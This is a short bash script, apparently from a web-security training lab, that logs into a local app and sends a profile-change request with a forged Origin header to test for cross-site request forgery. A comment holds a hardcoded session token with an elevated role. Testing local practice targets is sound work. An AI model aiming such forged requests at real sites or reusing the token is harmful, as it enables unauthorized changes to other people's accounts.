# #!/bin/bash
# curl -sS -o /dev/null -D - \
#   -X POST 'http://localhost:4942/profile/me/settings' \
#   -H 'Content-Type: application/x-www-form-urlencoded' \
#   -H 'Origin: http://darkly.example.site.com' \
#   -H 'Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ6NHAxY254NDdtZnk1MGYiLCJsb2dpbiI6Impkb2UiLCJyb2xlIjoiZ29kIiwiZXhwIjoxNzk0MjMyODQ4fQ.MOSHHW9u2u3ByEKeiUh-sWMiF8DVXyrzlbB7jjxQWxY' \
#   --data 'first_name=CSRF-Test&last_name=Doe&campus=Perpignan'

#!/usr/bin/env bash
set -euo pipefail

BASE_URL="http://localhost:4942"
COOKIE_JAR=$(mktemp)
trap 'rm -f "$COOKIE_JAR"' EXIT

read -r -p "Username: " USERNAME
read -r -s -p "Password: " PASSWORD
echo

echo "[1] Logging in..."

curl -sS \
  -c "$COOKIE_JAR" \
  -b "$COOKIE_JAR" \
  -X POST "$BASE_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "login=$USERNAME" \
  --data-urlencode "password=$PASSWORD" \
  -o /dev/null

if ! grep -qE '[[:space:]]session[[:space:]]' "$COOKIE_JAR"; then
  echo "No session cookie found. Check login endpoint and field names."
  exit 1
fi

echo "[2] Testing profile modification with forged Origin..."

curl -sS -o /dev/null -D - \
  -b "$COOKIE_JAR" \
  -X POST "$BASE_URL/profile/me/settings" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: http://darkly.example.site.com" \
  --data-urlencode "first_name=CSRF-Test" \
  --data-urlencode "last_name=Doe" \
  --data-urlencode "campus=Perpignan"
